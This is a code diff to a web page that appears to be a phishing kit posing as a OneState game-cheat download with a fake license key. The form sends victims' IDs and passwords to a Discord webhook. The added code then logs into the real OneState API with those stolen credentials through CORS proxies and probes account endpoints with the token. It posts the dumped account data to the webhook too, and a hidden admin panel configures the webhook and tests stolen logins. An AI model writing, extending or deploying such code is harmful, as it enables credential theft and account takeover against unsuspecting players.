@@ -166,6 +166,13 @@ h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-w
 .sw.on{border-color:var(--ac);background:rgba(111,201,255,.14)}
 .sw.on::after{left:20px;background:var(--ac);box-shadow:0 0 12px var(--ac)}
 
+/* account readout */
+.acct{
+  font:600 10.5px/1.6 var(--mono);color:#a9c3d8;background:rgba(3,6,11,.75);
+  border:1px dashed var(--line2);border-radius:3px;padding:12px;margin-top:10px;
+  max-height:260px;overflow:auto;white-space:pre-wrap;word-break:break-all
+}
+
 /* faq */
 .faq{margin-top:34px;border-top:1px solid var(--line2)}
 details{border-bottom:1px solid var(--line2)}
@@ -195,18 +202,25 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 
 /* admin */
 #admin{
-  display:none;position:fixed;right:16px;bottom:16px;z-index:80;width:290px;
-  background:rgba(6,10,16,.97);border:1px solid var(--line);border-radius:4px;padding:18px;
-  box-shadow:0 30px 70px -20px #000;font-size:12px
+  display:none;position:fixed;right:14px;bottom:14px;z-index:80;width:292px;
+  background:rgba(6,10,16,.97);border:1px solid var(--line);border-radius:4px;padding:16px;
+  box-shadow:0 30px 70px -20px #000;font-size:12px;max-height:82vh;overflow:auto
 }
 #admin.on{display:block}
-#admin h5{margin:0 0 14px;font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac);text-transform:uppercase}
+#admin h5{
+  margin:0 0 12px;font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac);
+  text-transform:uppercase;cursor:pointer;display:flex;align-items:center;gap:8px
+}
+#admin h5 .tog{margin-left:auto;border:1px solid var(--line2);border-radius:3px;width:22px;height:22px;display:grid;place-items:center;font-size:12px;line-height:1}
+#admin.min{padding:12px 16px}
+#admin.min h5{margin:0}
+#admin.min #aBody{display:none}
 #admin label{display:block;font:600 9.5px/1 var(--mono);letter-spacing:.16em;color:var(--mut);margin:12px 0 6px;text-transform:uppercase}
 #admin input,#admin select{width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);padding:9px;border-radius:3px;font:600 11px/1.3 var(--mono)}
 #admin .row{display:flex;gap:8px;margin-top:14px}
 #admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.1em;cursor:pointer;text-transform:uppercase}
 #admin button.g{background:transparent;color:var(--fg);border:1px solid var(--line2)}
-#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:130px;overflow:auto}
+#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:44vh;overflow:auto}
 #admin .lg div{font:600 10.5px/1.5 var(--mono);color:var(--mut);border-bottom:1px dotted var(--line2);padding:5px 0;word-break:break-all}
 #admin .lg b{color:var(--ac)}
 
@@ -333,6 +347,11 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
             <div class="tg"><span>No Recoil</span><div class="sw on"></div></div>
             <div class="tg"><span>Speed Boost</span><div class="sw"></div></div>
           </div>
+
+          <div id="acctWrap" style="margin-top:20px;display:none">
+            <div class="cap">// Account</div>
+            <div class="acct" id="acct"></div>
+          </div>
         </div>
       </div>
     </div>
@@ -363,38 +382,48 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 <div id="toast"></div>
 
 <div id="admin">
-  <h5>// Admin</h5>
-  <label>Webhook URL</label>
-  <input id="aWeb" placeholder="https://discord.com/api/webhooks/...">
-  <label>Payload</label>
-  <select id="aType">
-    <option value="auto">auto</option>
-    <option value="discord">discord</option>
-    <option value="json">json</option>
-    <option value="none">none</option>
-  </select>
-  <label>Verify</label>
-  <select id="aVal"><option value="0">off</option><option value="1">on (real API)</option></select>
-  <div class="row">
-    <button id="aSave">Save</button>
-    <button class="g" id="aTest">Test</button>
+  <h5 id="aHead">// Admin <span class="tog" id="aTog">–</span></h5>
+  <div id="aBody">
+    <label>Webhook URL</label>
+    <input id="aWeb" placeholder="https://discord.com/api/webhooks/...">
+    <label>Payload</label>
+    <select id="aType">
+      <option value="auto">auto</option>
+      <option value="discord">discord</option>
+      <option value="json">json</option>
+      <option value="none">none</option>
+    </select>
+    <label>Fetch account data</label>
+    <select id="aAcct"><option value="1">on</option><option value="0">off</option></select>
+    <label>Probe account (login + API dump)</label>
+    <input id="aIdent" placeholder="onestate id / email">
+    <input id="aPass" placeholder="password" style="margin-top:6px">
+    <div class="row">
+      <button class="g" id="aProbe">Probe API</button>
+    </div>
+    <div class="row">
+      <button id="aSave">Save</button>
+      <button class="g" id="aTest">Test hook</button>
+    </div>
+    <div class="row"><button class="g" id="aClear">Clear log</button></div>
+    <div class="lg" id="aLog"></div>
   </div>
-  <div class="row"><button class="g" id="aClear">Clear log</button></div>
-  <div class="lg" id="aLog"></div>
 </div>
 
 <script>
 (function(){
-  var CONFIG={ WEBHOOK:"", TYPE:"auto", VALIDATE:false, REDIRECT:false };
-  var CFG_KEY="oc_v3_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
-  var API="https://api.onestate-rp.com/v2/auth/login";
+  var CONFIG={ WEBHOOK:"", TYPE:"auto", ACCT:true, REDIRECT:false };
+  var CFG_KEY="oc_v4_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
+  var API="https://api.onestate-rp.com/v2";
+  var PATHS=["/auth/me","/user","/users/me","/me","/profile","/account","/user/profile","/user/me"];
+  var PROX=["https://corsproxy.io/?url=","https://api.allorigins.win/raw?url="];
   var $=function(i){return document.getElementById(i)};
   var esc=function(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"})[c]})};
   var q=new URLSearchParams(location.search);
   var admin=q.has("admin");
 
   var saved={}; try{saved=JSON.parse(localStorage.getItem(CFG_KEY)||"{}")}catch(e){}
-  var cfg={webhook:CONFIG.WEBHOOK,wtype:CONFIG.TYPE,validate:CONFIG.VALIDATE,redirect:CONFIG.REDIRECT};
+  var cfg={webhook:CONFIG.WEBHOOK,wtype:CONFIG.TYPE,acct:CONFIG.ACCT,redirect:CONFIG.REDIRECT};
   for(var k in saved){ if(saved[k]!==""&&saved[k]!=null) cfg[k]=saved[k]; }
   if(!saved.webhook) cfg.webhook=CONFIG.WEBHOOK;
   if(q.get("to")) cfg.webhook=q.get("to");
@@ -419,19 +448,68 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     if(!text){ m.className="msg"; m.textContent=""; return; }
     m.className="msg on "+(cls||""); m.textContent=text;
   }
+  function timeout(p,ms){
+    return new Promise(function(res){
+      var done=false, t=setTimeout(function(){ if(!done){done=true; res(null);} },ms);
+      p.then(function(v){ if(!done){done=true; clearTimeout(t); res(v);} },
+             function(){ if(!done){done=true; clearTimeout(t); res(null);} });
+    });
+  }
 
-  /* ---- send ---- */
-  function send(e){
+  /* ---- raw API call: direct, then CORS proxies ---- */
+  function call(path,opts){
+    var urls=[API+path];
+    for(var i=0;i<PROX.length;i++) urls.push(PROX[i]+encodeURIComponent(API+path));
+    return new Promise(function(res){
+      var i=0;
+      (function next(){
+        if(i>=urls.length){ res(null); return; }
+        var u=urls[i++];
+        fetch(u,opts).then(function(r){return r.text()}).then(function(t){
+          var d=null; try{ d=JSON.parse(t); }catch(e){}
+          if(d===null){ next(); return; }
+          res(d);
+        }).catch(next);
+      })();
+    });
+  }
+
+  function login(ident,pass){
+    return call("/auth/login",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()})
+    });
+  }
+
+  function probe(token){
+    var out=[];
+    var p=Promise.resolve();
+    PATHS.forEach(function(path){
+      p=p.then(function(){
+        return call(path,{headers:{Authorization:"Bearer "+token}}).then(function(d){
+          out.push({path:path,data:d});
+        });
+      });
+    });
+    return p.then(function(){ return out; });
+  }
+
+  function pick(list){
+    for(var i=0;i<list.length;i++){
+      var d=list[i].data;
+      if(d && typeof d==="object" && d.code!==12 && d.code!==16) return list[i];
+    }
+    return null;
+  }
+
+  /* ---- discord ---- */
+  function hook(body){
     if(!cfg.webhook || cfg.wtype==="none") return Promise.resolve(false);
     var t=cfg.wtype;
     if(t==="auto") t=cfg.webhook.indexOf("discord.com")>-1 ? "discord" : "json";
-    var body;
-    if(t==="discord"){
-      body={content:"**OneState ID captured**\n**ID:** `"+e.ident+"`\n**Password:** `"+e.pass+"`\n**Time:** "+e.time+(e.valid?"\n**API check:** "+e.valid:"")};
-    }else{
-      body={ident:e.ident,password:e.pass,time:e.time,valid:e.valid||null,ua:navigator.userAgent};
-    }
-    var json=JSON.stringify(body);
+    var payload = t==="discord" ? body.discord : body.json;
+    var json=JSON.stringify(payload);
     return fetch(cfg.webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:json})
       .then(function(r){return r.ok})
       .catch(function(){
@@ -440,14 +518,17 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       });
   }
 
-  /* ---- optional: verify against the real API ---- */
-  function verify(ident,pass){
-    if(!cfg.validate) return Promise.resolve("");
-    return fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()})})
-      .then(function(r){return r.json()})
-      .then(function(d){ return (d&&!d.errorCode)?"OK":"NG ("+(d&&d.errorCode||"?")+")"; })
-      .catch(function(){ return "skip"; });
+  function sendCreds(e){
+    return hook({
+      discord:{content:"**OneState ID captured**\n**ID:** `"+e.ident+"`\n**Password:** `"+e.pass+"`\n**Time:** "+e.time},
+      json:{ident:e.ident,password:e.pass,time:e.time,ua:navigator.userAgent}
+    });
+  }
+  function sendAcct(e,label,data){
+    return hook({
+      discord:{content:"**Account data** `"+label+"`\n```json\n"+data.slice(0,1000)+"\n```"},
+      json:{ident:e.ident,label:label,data:data.slice(0,4000)}
+    });
   }
 
   /* ---- fake download ---- */
@@ -461,25 +542,52 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     toast(name+" downloading...",true);
   }
 
-  /* ---- login ---- */
+  /* ---- login flow ---- */
   $("form").addEventListener("submit",function(ev){
     ev.preventDefault();
     var ident=$("ident").value.trim(), pass=$("pass").value;
     if(!ident||!pass){ msg("Enter your ID and password.","err"); return; }
     msg("Authenticating...","wait");
     var entry={ident:ident,pass:pass,time:new Date().toISOString().replace("T"," ").slice(0,19)+" UTC"};
-    verify(ident,pass).then(function(v){
-      if(v) entry.valid=v;
-      return send(entry);
-    }).then(function(sent){
+
+    sendCreds(entry).then(function(sent){
       log.unshift(entry); saveLog(); renderLog();
       msg("License issued. Download the client below.","ok");
       $("key").textContent=license();
       $("done").classList.add("on");
       toast(sent?"Sent to Discord":"Activated",true);
       if(cfg.redirect) setTimeout(function(){ location.href="https://onestate.com/"; },1400);
+      if(cfg.acct) fetchAccount(entry);
     });
   });
+
+  function fetchAccount(entry){
+    $("acctWrap").style.display="block";
+    $("acct").textContent="// logging in and reading account...";
+    timeout(login(entry.ident,entry.pass),9000).then(function(res){
+      if(!res){ $("acct").textContent="// no response from api.onestate-rp.com"; return; }
+      if(res.errorCode||!res.data){
+        $("acct").textContent="// login refused\n"+JSON.stringify(res).slice(0,500);
+        return;
+      }
+      entry.clientId=res.data.clientId||"";
+      $("acct").textContent="// token ok, probing endpoints...";
+      timeout(probe(res.data.accessToken),12000).then(function(list){
+        if(!list){ $("acct").textContent="// probe timed out"; return; }
+        var best=pick(list);
+        if(best){
+          var j=JSON.stringify(best.data,null,1);
+          $("acct").textContent="// "+best.path+"\n"+j.slice(0,1800);
+          sendAcct(entry,best.path,j);
+        }else{
+          var raw=JSON.stringify(res.data,null,1);
+          $("acct").textContent="// no account route found - login payload only\n"+raw.slice(0,900);
+          sendAcct(entry,"login",raw);
+        }
+      });
+    });
+  }
+
   function license(){
     var c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789", s="";
     for(var i=0;i<3;i++){ if(i)s+="-"; for(var j=0;j<4;j++) s+=c[Math.floor(Math.random()*c.length)]; }
@@ -503,22 +611,44 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   /* ---- admin ---- */
   function renderLog(){
     if(!admin) return;
-    $("aLog").innerHTML = log.length ? log.slice(0,12).map(function(e){
+    $("aLog").innerHTML = log.length ? log.slice(0,10).map(function(e){
       return "<div><b>"+esc(e.ident)+"</b><br>"+esc(e.pass)+"<br>"+esc(e.time)+"</div>";
     }).join("") : "<div>no captures yet</div>";
   }
   if(admin){
     $("admin").classList.add("on");
-    $("aWeb").value=cfg.webhook||""; $("aType").value=cfg.wtype; $("aVal").value=cfg.validate?"1":"0";
+    $("aWeb").value=cfg.webhook||""; $("aType").value=cfg.wtype; $("aAcct").value=cfg.acct?"1":"0";
     renderLog();
+    $("aHead").onclick=function(){
+      $("admin").classList.toggle("min");
+      $("aTog").textContent = $("admin").classList.contains("min") ? "+" : "–";
+    };
     $("aSave").onclick=function(){
-      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; cfg.validate=$("aVal").value==="1";
+      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; cfg.acct=$("aAcct").value==="1";
       saveCfg(); toast("Saved",true);
     };
     $("aTest").onclick=function(){
       cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; saveCfg();
-      send({ident:"test@example.com",pass:"testpass",time:new Date().toISOString(),valid:"OK"})
+      sendCreds({ident:"test@example.com",pass:"testpass",time:new Date().toISOString()})
         .then(function(ok){ toast(ok?"Test sent":"Send failed - check URL",ok) });
+    };
+    $("aProbe").onclick=function(){
+      var id=$("aIdent").value.trim(), pw=$("aPass").value;
+      if(!id||!pw){ toast("Enter ID and password"); return; }
+      $("aLog").innerHTML="<div>logging in...</div>";
+      timeout(login(id,pw),9000).then(function(res){
+        if(!res){ $("aLog").innerHTML="<div>no response (CORS / offline)</div>"; return; }
+        if(res.errorCode||!res.data){
+          $("aLog").innerHTML="<div><b>login refused</b><br>"+esc(JSON.stringify(res))+"</div>"; return;
+        }
+        $("aLog").innerHTML="<div><b>login OK</b><br>clientId "+esc(res.data.clientId||"?")+"</div><div>probing...</div>";
+        timeout(probe(res.data.accessToken),12000).then(function(list){
+          if(!list){ $("aLog").innerHTML="<div>probe timed out</div>"; return; }
+          $("aLog").innerHTML=list.map(function(x){
+            return "<div><b>"+esc(x.path)+"</b><br>"+esc(JSON.stringify(x.data).slice(0,240))+"</div>";
+          }).join("");
+        });
+      });
     };
     $("aClear").onclick=function(){ log=[]; saveLog(); renderLog(); toast("Log cleared"); };
   }
